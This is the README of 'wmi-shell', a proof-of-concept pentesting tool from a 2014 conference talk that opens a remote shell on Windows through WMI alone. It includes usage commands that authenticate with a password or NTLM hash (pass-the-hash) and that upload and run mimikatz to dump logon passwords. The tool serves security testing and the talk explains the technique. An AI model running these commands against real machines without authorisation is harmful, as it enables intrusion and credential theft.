# wmi-shell

Proof-of-concept of an interactive shell on a target Windows machine using only the WMI system (no network shares are needed to extract command output).

Remote WMI access must be configured on the target. No SMB services are needed. All command output is obtained exclusively using the WMI access, through storage in the WMI repository.


## Usage

Launch the script on Kali Linux with either the cleartext password or the password hash of an administrator account on the target Windows machine:   
```
python -O wmi-shell.py <USERNAME> <PASSWORD> <TARGET_IP>
python -O wmi-shell.py <USERNAME> <LM:NTLM> <TARGET_IP>	
```
Usual Windows commands can be launched from the interactive shell the script provides:

```
>>> dir c:
```
A post-exploitation tool like mimikatz can also be uploaded and ran to extract passwords from the target:

```
>>> upload ../mimikatz.exe
>>> %TEMP%\mimikatz.exe privilege::debug sekurlsa::logonPasswords exit
```

## Requirements

Kali Linux 32-bit and 64-bit with Pass the Hash toolkit (installed by default). 

To make the script run from other systems, you must download and install the PTH toolkit and some old libraries needed by the wmis and wmic tools.

Example for a 64-bit Debian:
```bash
git clone https://github.com/byt3bl33d3r/pth-toolkit
sudo apt install multiarch-support
wget http://ftp.de.debian.org/debian/pool/main/libt/libtasn1-3/libtasn1-3_2.13-2+deb7u2_amd64.deb
wget http://ftp.de.debian.org/debian/pool/main/g/gnutls26/libgnutls26_2.12.20-8+deb7u5_amd64.deb
wget http://ftp.de.debian.org/debian/pool/main/libg/libgcrypt11/libgcrypt11_1.5.0-5+deb7u4_amd64.deb
dpkg -i libgcrypt11_1.5.0-5+deb7u4_amd64.deb
dpkg -i libtasn1-3_2.13-2+deb7u2_amd64.deb
dpkg -i libgnutls26_2.12.20-8+deb7u5_amd64.deb
```

## Project details

This project was initially presented at the 2014 Hackito Ergo Sum conference by Andrei Dumitrescu. The presentation slides can be found online:
- <a href="http://2014.hackitoergosum.org/slides/day1_WMI_Shell_Andrei_Dumitrescu.pdf" target="_blank">http://2014.hackitoergosum.org/slides/day1_WMI_Shell_Andrei_Dumitrescu.pdf</a>
- <a href="https://speakerdeck.com/hackitoergosum/hes2014-wmi-shell-a-new-way-to-get-shells-on-remote-windows-machines-using-only-the-wmi-service-by-andrei-dumitrescu" target="_blank">https://speakerdeck.com/hackitoergosum/hes2014-wmi-shell-a-new-way-to-get-shells-on-remote-windows-machines-using-only-the-wmi-service-by-andrei-dumitrescu</a>

### Description:

The Windows Management Instrumentation (WMI) technology is included by default in all versions of Windows since Windows Millenium. The WMI technology is used by Windows administrators to get a variety of information concerning the target machine (like user account information, the list of running processes etc.) and to create/kill processes on the machine.

From a pentester’s point of view, WMI is just another method of executing commands remotely on target machines in a post-exploitation scenario. This can be achieved by creating processes on the remote machine using a WMI client. However, at the present time the output of the executed command cannot be easily recovered ; a potential solution would be write the output to a file and get these files using the SMB server on port 445, but this requires having remote file access on the target machine, which might not always be the case.

We have developed a tool that allows us to execute commands and get their output using only the WMI infrastructure, without any help from other services, like the SMB server. With the wmi-shell tool we can execute commands, upload files and recover Windows passwords remotely using just the WMI service that listens on port 135. During this talk we will quickly review current authenticated remote code execution methods available for Windows, we will explain the aspects of the WMI architecture that make the wmi-shell possible and we will present the tool itself (demo & links to the source code).

